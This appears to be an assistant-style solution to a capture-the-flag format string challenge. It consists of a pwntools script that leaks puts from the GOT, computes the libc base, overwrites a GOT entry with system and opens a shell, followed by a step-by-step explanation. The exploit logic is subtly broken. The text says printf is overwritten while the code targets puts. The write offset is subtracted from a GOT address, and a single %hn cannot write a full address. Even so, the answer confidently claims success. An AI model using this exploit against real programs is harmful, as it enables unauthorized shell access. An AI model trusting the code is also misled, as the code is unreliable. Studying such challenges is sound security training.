To solve this challenge using `pwntools`, we need to exploit the format string vulnerability in the `printf` function. The main loop reads input into a buffer and then passes it directly to `printf`, which allows us to control the format string. We can use this to overwrite the GOT (Global Offset Table) entries with the address of `system` or any other function we want to call, such as `puts` to leak a libc address and then `system` to get a shell.

Here are the steps and the corresponding code to solve this challenge:

### Steps:
1. **Leak a libc address**:
   - Use a format string to leak the address of a known function (e.g., `puts`) from the GOT.
   - Calculate the base address of libc.

2. **Overwrite a GOT entry**:
   - Overwrite the GOT entry of a function (e.g., `printf` or `puts`) with the address of `system`.

3. **Trigger the overwritten function**:
   - Call the overwritten function with the argument `/bin/sh` to get a shell.

### Code:

```python
from pwn import *

# Set up pwntools
context.binary = './fmt'
elf = context.binary
libc = ELF('libc.so.6')

# Start the process
p = process('./fmt')

# Step 1: Leak the address of puts from the GOT
puts_got = elf.got['puts']
log.info(f'puts@GOT: {hex(puts_got)}')

# Craft the payload to leak the address of puts
payload = b'%7$s' + p32(puts_got)
p.sendline(payload)

# Receive the leaked address
leaked_puts = u32(p.recv(4))
log.info(f'Leaked puts: {hex(leaked_puts)}')

# Calculate the base address of libc
libc_base = leaked_puts - libc.symbols['puts']
log.info(f'Libc base: {hex(libc_base)}')

# Step 2: Overwrite the GOT entry of printf with the address of system
system_addr = libc_base + libc.symbols['system']
log.info(f'system: {hex(system_addr)}')

# Calculate the offset to write the address of system
offset = (system_addr & 0xFFFFFFFF) - (puts_got & 0xFFFFFFFF)
if offset < 0:
    offset += 0x100000000

# Craft the payload to overwrite the GOT entry
payload = f'%{offset}c%7$hn'.encode() + p32(puts_got)
p.sendline(payload)

# Step 3: Trigger the overwritten function
p.sendline(b'/bin/sh\x00')

# Interact with the shell
p.interactive()
```

### Explanation:

1. **Leak the address of `puts`**:
   - We use the format string `'%7$s'` to read the value at the address stored in the 7th parameter (which is the address of `puts` in the GOT).
   - We send the payload and receive the leaked address.

2. **Calculate the base address of libc**:
   - Subtract the known offset of `puts` in libc from the leaked address to get the base address of libc.

3. **Overwrite the GOT entry**:
   - We calculate the offset needed to write the address of `system` into the GOT entry of `puts`.
   - We craft the payload `f'%{offset}c%7$hn'` to write the calculated offset into the GOT entry of `puts`.

4. **Trigger the overwritten function**:
   - We send the string `'/bin/sh\x00'` to trigger the overwritten `puts` function, which now points to `system`.

5. **Interact with the shell**:
   - Finally, we interact with the shell to get a shell prompt.

This should give you a shell and solve the challenge. Make sure to adjust the offsets and addresses if necessary based on the actual binary and libc version you are working with.
